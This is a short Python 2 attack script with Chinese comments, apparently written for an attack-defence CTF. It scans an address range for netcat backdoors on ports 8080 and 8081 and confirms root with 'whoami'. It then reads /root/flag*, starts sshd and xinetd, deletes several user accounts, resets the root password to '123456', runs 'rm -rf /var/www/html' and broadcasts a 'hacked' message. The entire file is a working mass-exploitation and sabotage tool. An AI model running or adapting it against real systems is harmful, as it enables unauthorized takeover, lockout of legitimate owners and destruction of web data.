# coding=utf-8
# 没测试过windows平台,如果要允许在windows下需要安装pexpect和netaddr
import pexpect
import optparse
from netaddr import *
import os

parser = optparse.OptionParser()
parser.add_option('-t', dest='target', type='string')

(options, args) = parser.parse_args()

target = options.target
port_list = [8080, 8081]

# IPNetwork 不支持横杠,只支持192.168.100.0/24这样的
for ip in IPNetwork(target):
    for port in port_list:
        cmd = 'nc %s %d' % (ip, port)
        child = pexpect.spawn(cmd)

        # 要浪费5秒,没办法
        # response = child.expect(['UNKNOWN', pexpect.TIMEOUT], timeout=1)

        # EOF:This usually means the child has exited.
        # UNKNOWN: 连接失败

        child.sendline('whoami')
        # 多次经验,大概率是ROOT权限 加入EOF是防止程序抛出这个异常导致程序直接结束
        if child.expect(['root', pexpect.TIMEOUT, pexpect.EOF], timeout=1) != 0:
            # 证明服务器开放了端口,但是这个端口允许的不是后门程序
            print '[X] %s:%d fake backdoor,passed,already been hacked?' % (ip, port)
            continue

        print '[#] %s:%d opened,start hakcing' % (ip, port)

        # 储存的log路径
        path = os.path.join(os.getcwd(), 'nc_%s_%d' % (ip, port))

        # python 2.4以上才可以使用with语句
        with open(path, 'wb') as f:

            # 下面的所有内容都会被记录到path路径的文件里面,没办法
            child.logfile = f

            # Get the flag
            child.sendline('service sshd start')
            child.sendline('service xinetd start')

            child.sendline('cat /root/flag*')

            # Delete the funny backdoor users
            child.sendline('/usr/sbin/userdel -f admin')
            child.sendline('/usr/sbin/userdel -f hacker')
            child.sendline('/usr/sbin/userdel -f test')

            # Help him to change password
            child.sendline('echo root:123456 | /usr/sbin/chpasswd')

            # Help him to remove dangerous website content
            child.sendline('rm -rf /var/www/html')

            # Tell him I'm helpful
            child.sendline('echo "XD You has been hacked" | wall')

            # And exit the game,also stop this backdoor
            child.sendline('exit')
            child.expect(pexpect.EOF)
            print '[CTF] %s:%d finished hacking,see file %s' % (ip, port, path)
